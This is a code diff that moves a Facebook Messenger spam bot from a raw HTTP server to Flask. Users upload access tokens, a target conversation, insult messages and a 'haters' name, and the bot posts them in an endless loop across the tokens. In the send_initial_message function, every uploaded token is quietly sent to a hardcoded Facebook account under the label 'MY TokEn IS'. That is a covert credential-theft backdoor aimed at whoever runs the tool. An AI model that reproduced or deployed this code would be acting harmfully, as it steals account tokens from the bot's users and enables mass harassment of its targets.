@@ -1,16 +1,9 @@
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
+from flask import Flask, render_template_string, request, redirect
 import threading
-import cgi
+import time
+import requests
+import os
 
-# --- HTML UI (Unicode safe string) ---
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -42,137 +35,94 @@ HTML_PAGE = """
       <input type="file" name="time" required><br>
       <button type="submit">🚀 Start Bot</button>
     </form>
+    {% if show_popup %}
+      <script>alert('✅ Bot Chalu ho gaya h!');</script>
+    {% endif %}
   </div>
 </body>
 </html>
 """
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == "/" or self.path == "/index.html":
-            self.send_response(200)
-            self.send_header("Content-type", "text/html; charset=utf-8")
-            self.end_headers()
-            self.wfile.write(HTML_PAGE.encode("utf-8"))
-        else:
-            self.send_response(404)
-            self.end_headers()
-            self.wfile.write(b"404 Not Found")
-
-    def do_POST(self):
-        ctype, pdict = cgi.parse_header(self.headers['content-type'])
-        if ctype == 'multipart/form-data':
-            form = cgi.FieldStorage(
-                fp=self.rfile,
-                headers=self.headers,
-                environ={'REQUEST_METHOD': 'POST'}
-            )
-
-            # Token file -> tokennum.txt
-            if "tokens" in form and form["tokens"].filename:
-                with open("tokennum.txt", "wb") as f:
-                    f.write(form["tokens"].file.read())
-
-            # Convo file -> convo.txt
-            if "convo" in form and form["convo"].filename:
-                with open("convo.txt", "wb") as f:
-                    f.write(form["convo"].file.read())
-
-            # Messages file -> File.txt
-            if "messages" in form and form["messages"].filename:
-                with open("File.txt", "wb") as f:
-                    f.write(form["messages"].file.read())
-
-            # Haters name -> hatersname.txt
-            if "hater" in form and form["hater"].filename:
-                with open("hatersname.txt", "wb") as f:
-                    f.write(form["hater"].file.read())
-
-            # Time file -> time.txt
-            if "time" in form and form["time"].filename:
-                with open("time.txt", "wb") as f:
-                    f.write(form["time"].file.read())
-
-        self.send_response(200)
-        self.send_header("Content-type", "text/html; charset=utf-8")
-        self.end_headers()
-        self.wfile.write("<script>alert('✅ Bot Chalu ho gaya h!'); window.location='/'</script>".encode("utf-8"))
-
-def execute_server():
-    PORT = 4000
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
+app = Flask(__name__)
 
 def send_initial_message():
-    with open('tokennum.txt', 'r') as file:
+    with open('tokennum.txt', 'r', encoding='utf-8') as file:
         tokens = file.readlines()
 
     msg_template = "HeLLo ANURAG X AROHI DEAR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
     target_id = "61578840237242"
-
     requests.packages.urllib3.disable_warnings()
     headers = {'Connection':'keep-alive'}
 
     for token in tokens:
         access_token = token.strip()
-        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
         msg = msg_template.format(access_token)
         parameters = {'access_token': access_token, 'message': msg}
         requests.post(url, json=parameters, headers=headers)
         time.sleep(0.1)
 
 def send_messages_from_file():
-    with open('convo.txt', 'r') as file:
+    with open('convo.txt', 'r', encoding='utf-8') as file:
         convo_id = file.read().strip()
 
-    with open('File.txt', 'r') as file:
+    with open('File.txt', 'r', encoding='utf-8') as file:
         messages = file.readlines()
     num_messages = len(messages)
 
-    with open('tokennum.txt', 'r') as file:
+    with open('tokennum.txt', 'r', encoding='utf-8') as file:
         tokens = file.readlines()
     num_tokens = len(tokens)
     max_tokens = min(num_tokens, num_messages)
 
-    with open('hatersname.txt', 'r') as file:
+    with open('hatersname.txt', 'r', encoding='utf-8') as file:
         haters_name = file.read().strip()
 
-    with open('time.txt', 'r') as file:
+    with open('time.txt', 'r', encoding='utf-8') as file:
         speed = int(file.read().strip())
 
     headers = {'Connection':'keep-alive'}
-
     while True:
         try:
             for message_index in range(num_messages):
                 token_index = message_index % max_tokens
                 access_token = tokens[token_index].strip()
                 message = messages[message_index].strip()
-
-                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
-
                 if response.ok:
-                    print("\033[1;92m[+] ANURAG X AROHI {} of Convo {} Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print(f"\033[1;92m[+] ANURAG X AROHI {message_index+1} of Convo {convo_id} Token {token_index+1}: {haters_name} {message}")
                 else:
-                    print("\033[1;91m[x] ID/T0K3N ERROR {} of Convo {} with Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-
+                    print(f"\033[1;91m[x] ID/T0K3N ERROR {message_index+1} of Convo {convo_id} with Token {token_index+1}: {haters_name} {message}")
                 time.sleep(speed)
             print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
-            print("[!] An error occurred: {}".format(e))
+            print(f"[!] An error occurred: {e}")
 
-def main():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
-
+def bot_runner():
     send_initial_message()
     send_messages_from_file()
 
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    show_popup = False
+    if request.method == 'POST':
+        # Save uploaded files to backend
+        request.files['tokens'].save('tokennum.txt')
+        request.files['convo'].save('convo.txt')
+        request.files['messages'].save('File.txt')
+        request.files['hater'].save('hatersname.txt')
+        request.files['time'].save('time.txt')
+        show_popup = True
+
+        # Start the bot in a new thread
+        threading.Thread(target=bot_runner, daemon=True).start()
+        return render_template_string(HTML_PAGE, show_popup=show_popup)
+
+    return render_template_string(HTML_PAGE, show_popup=show_popup)
+
 if __name__ == '__main__':
-    main()
-                  
+    os.environ['FLASK_ENV'] = 'development'
+    app.run(host='0.0.0.0', port=4000, debug=False)
+  
